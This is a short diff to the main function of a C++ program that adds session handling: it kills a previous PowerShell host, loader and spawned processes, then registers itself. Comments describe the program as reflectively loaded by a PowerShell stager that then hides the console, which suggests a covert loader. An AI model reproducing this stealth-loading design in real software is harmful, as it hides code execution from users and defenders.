@@ -8,6 +8,7 @@
 #include "protect.h"
 #include "control.h"
 #include "launcher.h"
+#include "session.h"
 
 // Runtime globals declared in config.h — defined here so the linker
 // finds exactly one copy.
@@ -61,6 +62,14 @@ int main(int argc, char** argv) {
 
     open_log();
     std::cout << "[main] log opened" << std::endl;
+
+    // Nuke any prior session first — kills the previous PowerShell
+    // host, its loader, and every product it spawned. Runs BEFORE we
+    // hide our own console so if the kill somehow blocks the user
+    // still sees what happened.
+    session::kill_previous();
+    session::register_self();
+    std::cout << "[main] session claimed (host pid=" << GetCurrentProcessId() << ")" << std::endl;
 
     // Hide whatever console we're attached to. When reflectively loaded
     // by the PowerShell stager this is PowerShell's window itself.
